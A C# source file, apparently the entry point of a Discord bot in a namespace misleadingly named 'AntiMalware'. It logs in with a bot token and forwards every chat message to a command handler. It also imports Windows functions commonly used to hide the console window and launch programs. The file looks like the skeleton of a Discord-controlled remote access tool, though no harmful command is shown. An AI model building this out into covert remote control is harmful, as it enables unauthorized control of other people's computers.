using Discord;
using Discord.WebSocket;
using System.Runtime.InteropServices;
using System.Windows.Controls;
namespace AntiMalware
{
    class Program
    {
        private static DiscordSocketClient client = new DiscordSocketClient();
        private static init init = new init();
        private static Command Command = new Command();
        private static value value = new value();
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
        static void Main(string[] args)
        {
            //봇 시작전 초기화
            init.Init();
            //봇 시작
            BotMain().GetAwaiter().GetResult();
            //메시지를 받았을시
            async Task OnClientMessage(SocketMessage arg)
            {
                SocketUserMessage message = arg as SocketUserMessage;
                if (message.Author.IsBot || message.Author.IsWebhook || message == null)
                    return;
                await Command.command(message);
            }
            // 봇 시작 함수
            async Task BotMain()
            {
                // 봇 초기화
                client = new DiscordSocketClient(new DiscordSocketConfig()
                {
                    GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent,
                    LogLevel = LogSeverity.Verbose
                });
                await client.LoginAsync(TokenType.Bot, value.bot_token); 
                await client.StartAsync();                    
                // OnClientMessage가 디스코드 메시지 수신시 작동하도록 세팅
                client.MessageReceived += OnClientMessage; 

                await Task.Delay(-1);  
            }
        }
    }
}


